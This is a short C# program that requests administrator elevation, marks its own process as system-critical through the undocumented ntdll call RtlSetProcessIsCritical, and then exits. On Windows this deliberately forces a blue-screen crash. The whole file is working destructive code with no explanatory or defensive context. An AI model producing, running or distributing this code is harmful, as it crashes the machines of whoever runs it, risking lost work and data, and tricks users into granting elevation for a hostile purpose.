using System;
using System.Diagnostics;
using System.Reflection;
using System.Runtime.InteropServices;

namespace SetProcessIsCritical {
    public abstract class Program {
        [DllImport("ntdll.dll")]
        private static extern void RtlSetProcessIsCritical(uint newValue, uint oldValue, uint checkFlag);

        private static void Main() {
            SetProcessIsCritical();
        }

        public static void SetProcessIsCritical() {
            try {
                Process.EnterDebugMode();
            } catch (Exception) {
                var process = new Process {
                    StartInfo = {
                        FileName = Assembly.GetExecutingAssembly().Location,
                        UseShellExecute = true,
                        Verb = "runas"
                    }
                };
                try {
                    process.Start();
                } catch (Exception) {
                    return;
                }
            }

            RtlSetProcessIsCritical(1, 0, 0);

            Environment.Exit(1);
        }
    }
}